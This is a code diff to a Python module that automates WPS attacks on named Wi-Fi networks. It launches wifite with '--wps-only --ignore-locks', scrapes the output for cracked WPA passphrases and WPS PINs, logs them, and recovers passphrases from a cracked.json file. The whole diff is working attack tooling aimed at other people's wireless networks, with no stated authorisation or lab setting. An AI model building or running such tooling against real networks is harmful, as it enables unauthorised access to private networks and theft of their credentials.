@@ -2,13 +2,48 @@ import subprocess
 import time
 import re
 import logging
+import os
+import json
+from constants import BASE_DIR, CRACKED_FILE
 from utils import strip_ansi
+
+ATTACK_TIMEOUT = 360
+WIFITE_ARGS = [
+    "wifite",
+    "--wps-only",
+    "--ignore-locks"
+]
+
+
+def extract_psk(line):
+    if "WPA PSK:" in line or "PSK/Password:" in line:
+        match = re.search(r'(?:WPA PSK|PSK/Password):\s*(.+)', line)
+        if match:
+            psk_candidate = match.group(1).strip().strip("'\"")
+            if psk_candidate.lower() != "n/a":
+                return psk_candidate
+    return None
+
+
+def extract_pin(line):
+    if "WPS PIN:" in line or "Cracked WPS PIN:" in line:
+        match = re.search(r'WPS PIN:\s*([0-9]{8})', line)
+        if match:
+            return match.group(1).strip()
+    return None
+
 
 def attack_target(interface, essid):
     logging.info(f"Starting attack on {essid}...")
+
+    os.makedirs(BASE_DIR / "data", exist_ok=True)
+    os.chdir(BASE_DIR / "data")
+
     proc = subprocess.Popen(
-        ["wifite", "--wps-only", "--ignore-locks", "-i", interface, "-e", essid],
-        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
+        WIFITE_ARGS + ["-i", interface, "-e", essid],
+        stdout=subprocess.PIPE,
+        stderr=subprocess.STDOUT,
+        text=True
     )
 
     psk = None
@@ -21,27 +56,38 @@ def attack_target(interface, essid):
             continue
         logging.debug(f"[wifite] {line}")
 
-        if "WPA PSK:" in line or "PSK/Password:" in line:
-            match = re.search(r'(?:WPA PSK|PSK/Password):\s*(.+)', line)
-            if match:
-                psk_candidate = match.group(1).strip().strip("'\"")
-                if psk_candidate.lower() != "n/a":
-                    psk = psk_candidate
-                    logging.info(f"PSK found for {essid}: {psk}")
-                    break
+        if not psk:
+            psk = extract_psk(line)
+            if psk:
+                logging.info(f"PSK found for {essid}: {psk}")
+                break
 
-        if "WPS PIN:" in line or "Cracked WPS PIN:" in line:
-            match = re.search(r'WPS PIN:\s*([0-9]{8})', line)
-            if match:
-                pin = match.group(1).strip()
+        if not pin:
+            maybe_pin = extract_pin(line)
+            if maybe_pin:
+                pin = maybe_pin
                 logging.info(f"WPS PIN found for {essid}: {pin}")
 
-        if time.time() - start_time > 360:
-            logging.warning(f"Attack timeout (360s) reached for {essid}, terminating.")
+        if time.time() - start_time > ATTACK_TIMEOUT:
+            logging.warning(f"Attack timeout ({ATTACK_TIMEOUT}s) reached for {essid}, terminating.")
             proc.terminate()
             break
 
     proc.terminate()
+
+    # Fallback: try to recover PSK from cracked.json
+    if pin and not psk and CRACKED_FILE.exists():
+        try:
+            with open(CRACKED_FILE) as f:
+                cracked_data = json.load(f)
+            for entry in cracked_data:
+                if entry.get("essid") == essid and entry.get("pin") == pin:
+                    recovered_psk = entry.get("psk")
+                    if recovered_psk:
+                        psk = recovered_psk
+                        logging.info(f"Recovered PSK from cracked.json for {essid}: {psk}")
+        except Exception as e:
+            logging.warning(f"Failed to parse cracked.json: {e}")
 
     if psk:
         return {"psk": psk, "pin": pin}
